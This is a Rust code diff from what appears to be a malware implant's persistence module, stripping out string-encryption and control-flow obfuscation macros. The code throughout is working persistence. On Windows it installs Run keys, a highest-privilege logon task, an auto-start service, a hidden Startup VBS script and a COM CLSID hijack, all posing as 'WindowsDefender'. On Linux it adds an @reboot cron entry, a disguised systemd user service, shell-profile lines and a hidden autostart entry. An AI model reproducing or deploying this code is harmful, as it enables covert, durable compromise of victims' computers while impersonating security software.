@@ -37,257 +37,239 @@ pub fn persist() -> std::io::Result<()> {
 
 #[cfg(target_os = "windows")]
 fn windows_persist() -> std::io::Result<()> {
-    goldberg::goldberg_stmts!({
-        let current_exe = env::current_exe()?;
+    let current_exe = env::current_exe()?;
 
-        if crate::util::is_dll::is_dll() {
-            return dll_persistence(&current_exe);
-        }
+    if crate::util::is_dll::is_dll() {
+        return dll_persistence(&current_exe);
+    }
 
-        let appdata = env::var(cryptify::encrypt_string!("APPDATA"))
-            .map_err(|_| std::io::Error::new(std::io::ErrorKind::NotFound, "APPDATA not set"))?;
-        let target_path = Path::new(&appdata).join(TARGET_BIN);
+    let appdata = env::var("APPDATA")
+        .map_err(|_| std::io::Error::new(std::io::ErrorKind::NotFound, "APPDATA not set"))?;
+    let target_path = Path::new(&appdata).join(TARGET_BIN);
 
-        if current_exe != target_path {
-            fs::copy(&current_exe, &target_path)?;
-        }
+    if current_exe != target_path {
+        fs::copy(&current_exe, &target_path)?;
+    }
 
-        scheduled_task(&target_path);
-        windows_service(&target_path);
-        registry_runkey(&target_path);
+    scheduled_task(&target_path);
+    windows_service(&target_path);
+    registry_runkey(&target_path);
 
-        Ok(())
-    })
+    Ok(())
 }
 
 #[cfg(target_os = "windows")]
 fn registry_runkey(target_path: &Path) {
     let path_str = target_path.to_string_lossy().to_string();
     let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
-    if let Ok((key, _)) = hkcu.create_subkey(cryptify::encrypt_string!("Software\\Microsoft\\Windows\\CurrentVersion\\Run")) {
-        let _ = key.set_value(cryptify::encrypt_string!("WindowsDefender"), &path_str);
+    if let Ok((key, _)) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run") {
+        let _ = key.set_value("WindowsDefender", &path_str);
     }
 }
 
 #[cfg(target_os = "windows")]
 fn dll_persistence(dll_path: &Path) -> std::io::Result<()> {
-    goldberg::goldberg_stmts!({
-        let dll_str = dll_path.to_string_lossy().to_string();
+    let dll_str = dll_path.to_string_lossy().to_string();
 
-        let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
-        if let Ok((key, _)) = hkcu.create_subkey(cryptify::encrypt_string!("Software\\Microsoft\\Windows\\CurrentVersion\\Run")) {
-            let rundll_cmd = format!("rundll32.exe \"{}\",NetClientMain", dll_str);
-            let _ = key.set_value(cryptify::encrypt_string!("WindowsDefender"), &rundll_cmd);
-        }
+    let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
+    if let Ok((key, _)) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run") {
+        let rundll_cmd = format!("rundll32.exe \"{}\",NetClientMain", dll_str);
+        let _ = key.set_value("WindowsDefender", &rundll_cmd);
+    }
 
-        if let Ok(appdata) = env::var(cryptify::encrypt_string!("APPDATA")) {
-            let startup = Path::new(&appdata).join(cryptify::encrypt_string!("Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
-            let _ = fs::create_dir_all(&startup);
-            let vbs = format!(
-                "Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"rundll32.exe \"\"{}\"\",NetClientMain\", 0, False\n",
-                dll_str
-            );
-            let _ = fs::write(startup.join(cryptify::encrypt_string!("defender.vbs")), vbs);
-        }
+    if let Ok(appdata) = env::var("APPDATA") {
+        let startup = Path::new(&appdata).join("Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+        let _ = fs::create_dir_all(&startup);
+        let vbs = format!(
+            "Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"rundll32.exe \"\"{}\"\",NetClientMain\", 0, False\n",
+            dll_str
+        );
+        let _ = fs::write(startup.join("defender.vbs"), vbs);
+    }
 
-        let clsid_path = cryptify::encrypt_string!("Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\\InprocServer32");
-        if let Ok((key, _)) = hkcu.create_subkey(clsid_path) {
-            let _ = key.set_value(cryptify::encrypt_string!(""), &dll_str);
-            let _ = key.set_value(cryptify::encrypt_string!("ThreadingModel"), &cryptify::encrypt_string!("Apartment"));
-        }
+    let clsid_path = "Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\\InprocServer32";
+    if let Ok((key, _)) = hkcu.create_subkey(clsid_path) {
+        let _ = key.set_value("", &dll_str);
+            let _ = key.set_value("ThreadingModel", &"Apartment".to_string());
+    }
 
-        Ok(())
-    })
+    Ok(())
 }
 
 #[cfg(target_os = "windows")]
 fn scheduled_task(target_path: &Path) {
-    goldberg::goldberg_stmts!({
-        let path_str = target_path.to_string_lossy().to_string();
-        let _ = Command::new(cryptify::encrypt_string!("schtasks"))
-            .args(&[
-                cryptify::encrypt_string!("/create"), cryptify::encrypt_string!("/tn"), cryptify::encrypt_string!("WindowsDefender"),
-                cryptify::encrypt_string!("/tr"), path_str,
-                cryptify::encrypt_string!("/sc"), cryptify::encrypt_string!("onlogon"), cryptify::encrypt_string!("/rl"), cryptify::encrypt_string!("highest"), cryptify::encrypt_string!("/f"),
-            ])
-            .creation_flags(CREATE_NO_WINDOW)
-            .stdout(std::process::Stdio::null())
-            .stderr(std::process::Stdio::null())
-            .spawn();
-    })
+    let path_str = target_path.to_string_lossy().to_string();
+    let _ = Command::new("schtasks")
+        .args(&[
+            "/create", "/tn", "WindowsDefender",
+            "/tr", &path_str,
+            "/sc", "onlogon", "/rl", "highest", "/f",
+        ])
+        .creation_flags(CREATE_NO_WINDOW)
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .spawn();
 }
 
 #[cfg(target_os = "windows")]
 fn windows_service(target_path: &Path) {
-    goldberg::goldberg_stmts!({
-        let path_str = target_path.to_string_lossy().to_string();
-        let _ = Command::new(cryptify::encrypt_string!("sc"))
-            .args(&[cryptify::encrypt_string!("create"), cryptify::encrypt_string!("WindowsDefender"), cryptify::encrypt_string!("binPath="), path_str, cryptify::encrypt_string!("start="), cryptify::encrypt_string!("auto")])
-            .creation_flags(CREATE_NO_WINDOW)
-            .stdout(std::process::Stdio::null())
-            .stderr(std::process::Stdio::null())
-            .spawn();
-        std::thread::sleep(std::time::Duration::from_secs(goldberg::goldberg_int!(2)));
-        let _ = Command::new(cryptify::encrypt_string!("sc"))
-            .args(&[cryptify::encrypt_string!("start"), cryptify::encrypt_string!("WindowsDefender")])
-            .creation_flags(CREATE_NO_WINDOW)
-            .stdout(std::process::Stdio::null())
-            .stderr(std::process::Stdio::null())
-            .spawn();
-    })
+    let path_str = target_path.to_string_lossy().to_string();
+    let _ = Command::new("sc")
+        .args(&["create", "WindowsDefender", "binPath=", &path_str, "start=", "auto"])
+        .creation_flags(CREATE_NO_WINDOW)
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .spawn();
+    std::thread::sleep(std::time::Duration::from_secs(2));
+    let _ = Command::new("sc")
+        .args(&["start", "WindowsDefender"])
+        .creation_flags(CREATE_NO_WINDOW)
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .spawn();
 }
 
 // === Linux Persistence ===
 
 #[cfg(target_os = "linux")]
 fn linux_persist() -> std::io::Result<()> {
-    goldberg::goldberg_stmts!({
-        let home = env::var(cryptify::encrypt_string!("HOME"))
-            .map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
-        let target_dir = Path::new(&home).join(TARGET_DIR);
-        let target_path = target_dir.join(TARGET_BIN);
+    let home = env::var("HOME")
+        .map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
+    let target_dir = Path::new(&home).join(TARGET_DIR);
+    let target_path = target_dir.join(TARGET_BIN);
 
-        fs::create_dir_all(&target_dir)?;
+    fs::create_dir_all(&target_dir)?;
 
-        let current_exe = env::current_exe()?;
+    let current_exe = env::current_exe()?;
 
-        if current_exe != target_path {
-            fs::copy(&current_exe, &target_path)?;
-            let _ = fs::set_permissions(&target_path, std::os::unix::fs::PermissionsExt::from_mode(goldberg::goldberg_int!(0o755)));
-            Command::new(&target_path).spawn().ok();
-            std::process::exit(goldberg::goldberg_int!(0));
-        }
+    if current_exe != target_path {
+        fs::copy(&current_exe, &target_path)?;
+        let _ = fs::set_permissions(&target_path, std::os::unix::fs::PermissionsExt::from_mode(0o755));
+        Command::new(&target_path).spawn().ok();
+        std::process::exit(0);
+    }
 
-        cron_persistence(&target_path);
-        systemd_persistence(&target_path);
-        bashrc_persistence(&target_path);
-        autostart_desktop(&target_path);
+    cron_persistence(&target_path);
+    systemd_persistence(&target_path);
+    bashrc_persistence(&target_path);
+    autostart_desktop(&target_path);
 
-        Ok(())
-    })
+    Ok(())
 }
 
 #[cfg(target_os = "linux")]
 fn cron_persistence(target_path: &Path) {
-    goldberg::goldberg_stmts!({
-        let entry = format!("@reboot {}\n", target_path.display());
+    let entry = format!("@reboot {}\n", target_path.display());
 
-        let output = Command::new(cryptify::encrypt_string!("crontab")).arg(cryptify::encrypt_string!("-l")).output();
-        let existing = match output {
-            Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
-            Err(_) => String::new(),
-        };
+    let output = Command::new("crontab").arg("-l").output();
+    let existing = match output {
+        Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
+        Err(_) => String::new(),
+    };
 
-        if existing.contains(&target_path.to_string_lossy().to_string()) {
-            return;
-        }
+    if existing.contains(&target_path.to_string_lossy().to_string()) {
+        return;
+    }
 
-        let new_cron = existing + &entry;
-        let mut child = match Command::new(cryptify::encrypt_string!("crontab"))
-            .stdin(std::process::Stdio::piped())
-            .stdout(std::process::Stdio::null())
-            .stderr(std::process::Stdio::null())
-            .spawn()
-        {
-            Ok(c) => c,
-            Err(_) => return,
-        };
+    let new_cron = existing + &entry;
+    let mut child = match Command::new("crontab")
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .spawn()
+    {
+        Ok(c) => c,
+        Err(_) => return,
+    };
 
-        use std::io::Write;
-        if let Some(mut stdin) = child.stdin.take() {
-            let _ = stdin.write_all(new_cron.as_bytes());
-        }
-        let _ = child.wait();
-    })
+    use std::io::Write;
+    if let Some(mut stdin) = child.stdin.take() {
+        let _ = stdin.write_all(new_cron.as_bytes());
+    }
+    let _ = child.wait();
 }
 
 #[cfg(target_os = "linux")]
 fn systemd_persistence(target_path: &Path) {
-    goldberg::goldberg_stmts!({
-        let home = match env::var(cryptify::encrypt_string!("HOME")) {
-            Ok(h) => h,
-            Err(_) => return,
-        };
+    let home = match env::var("HOME") {
+        Ok(h) => h,
+        Err(_) => return,
+    };
 
-        let service_dir = Path::new(&home).join(cryptify::encrypt_string!(".config/systemd/user"));
-        let service_file = service_dir.join(cryptify::encrypt_string!("defender.service"));
+    let service_dir = Path::new(&home).join(".config/systemd/user");
+    let service_file = service_dir.join("defender.service");
 
-        let _ = fs::create_dir_all(&service_dir);
+    let _ = fs::create_dir_all(&service_dir);
 
-        let unit = format!(
-            "[Unit]\nDescription=User Session Manager\n\n[Service]\nExecStart={}\nRestart=on-failure\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n",
-            target_path.display()
-        );
+    let unit = format!(
+        "[Unit]\nDescription=User Session Manager\n\n[Service]\nExecStart={}\nRestart=on-failure\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n",
+        target_path.display()
+    );
 
-        if fs::write(&service_file, unit).is_err() {
-            return;
-        }
+    if fs::write(&service_file, unit).is_err() {
+        return;
+    }
 
-        let _ = Command::new(cryptify::encrypt_string!("systemctl"))
-            .args(&[cryptify::encrypt_string!("--user"), cryptify::encrypt_string!("enable"), cryptify::encrypt_string!("defender.service")])
-            .stdout(std::process::Stdio::null())
-            .stderr(std::process::Stdio::null())
-            .output();
+    let _ = Command::new("systemctl")
+        .args(&["--user", "enable", "defender.service"])
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .output();
 
-        let _ = Command::new(cryptify::encrypt_string!("systemctl"))
-            .args(&[cryptify::encrypt_string!("--user"), cryptify::encrypt_string!("start"), cryptify::encrypt_string!("defender.service")])
-            .stdout(std::process::Stdio::null())
-            .stderr(std::process::Stdio::null())
-            .output();
+    let _ = Command::new("systemctl")
+        .args(&["--user", "start", "defender.service"])
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .output();
 
-        let _ = Command::new(cryptify::encrypt_string!("systemctl"))
-            .args(&[cryptify::encrypt_string!("enable"), cryptify::encrypt_string!("defender.service")])
-            .stdout(std::process::Stdio::null())
-            .stderr(std::process::Stdio::null())
-            .output();
-    })
+    let _ = Command::new("systemctl")
+        .args(&["enable", "defender.service"])
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .output();
 }
 
 #[cfg(target_os = "linux")]
 fn bashrc_persistence(target_path: &Path) {
-    goldberg::goldberg_stmts!({
-        let home = match env::var(cryptify::encrypt_string!("HOME")) {
-            Ok(h) => h,
-            Err(_) => return,
-        };
+    let home = match env::var("HOME") {
+        Ok(h) => h,
+        Err(_) => return,
+    };
 
-        let target_str = target_path.to_string_lossy().to_string();
-        let parent_str = target_path.parent().map(|p| p.display().to_string()).unwrap_or_default();
-        let line = format!("\n# Startup\nexport PATH=\"$PATH:{}\"\n{}\n", parent_str, target_str);
+    let target_str = target_path.to_string_lossy().to_string();
+    let parent_str = target_path.parent().map(|p| p.display().to_string()).unwrap_or_default();
+    let line = format!("\n# Startup\nexport PATH=\"$PATH:{}\"\n{}\n", parent_str, target_str);
 
-        for rc_file in &[cryptify::encrypt_string!(".bashrc"), cryptify::encrypt_string!(".profile"), cryptify::encrypt_string!(".zshrc"), cryptify::encrypt_string!(".bash_profile")] {
-            let rc_path = Path::new(&home).join(rc_file);
-            if rc_path.exists() {
-                if let Ok(content) = fs::read_to_string(&rc_path) {
-                    if content.contains(&target_str) {
-                        continue;
-                    }
-                }
-                use std::io::Write;
-                if let Ok(mut file) = fs::OpenOptions::new().append(true).create(true).open(&rc_path) {
-                    let _ = file.write_all(line.as_bytes());
+    for rc_file in &[".bashrc", ".profile", ".zshrc", ".bash_profile"] {
+        let rc_path = Path::new(&home).join(rc_file);
+        if rc_path.exists() {
+            if let Ok(content) = fs::read_to_string(&rc_path) {
+                if content.contains(&target_str) {
+                    continue;
                 }
             }
+            use std::io::Write;
+            if let Ok(mut file) = fs::OpenOptions::new().append(true).create(true).open(&rc_path) {
+                let _ = file.write_all(line.as_bytes());
+            }
         }
-    })
+    }
 }
 
 #[cfg(target_os = "linux")]
 fn autostart_desktop(target_path: &Path) {
-    goldberg::goldberg_stmts!({
-        let home = match env::var(cryptify::encrypt_string!("HOME")) {
-            Ok(h) => h,
-            Err(_) => return,
-        };
+    let home = match env::var("HOME") {
+        Ok(h) => h,
+        Err(_) => return,
+    };
 
-        let autostart_dir = Path::new(&home).join(cryptify::encrypt_string!(".config/autostart"));
-        let _ = fs::create_dir_all(&autostart_dir);
+    let autostart_dir = Path::new(&home).join(".config/autostart");
+    let _ = fs::create_dir_all(&autostart_dir);
 
-        let desktop = format!(
-            "[Desktop Entry]\nType=Application\nName=defender\nExec={}\nX-GNOME-Autostart-enabled=true\nNoDisplay=true\n",
-            target_path.display()
-        );
+    let desktop = format!(
+        "[Desktop Entry]\nType=Application\nName=defender\nExec={}\nX-GNOME-Autostart-enabled=true\nNoDisplay=true\n",
+        target_path.display()
+    );
 
-        let _ = fs::write(autostart_dir.join(cryptify::encrypt_string!("defender.desktop")), desktop);
-    })
+    let _ = fs::write(autostart_dir.join("defender.desktop"), desktop);
 }
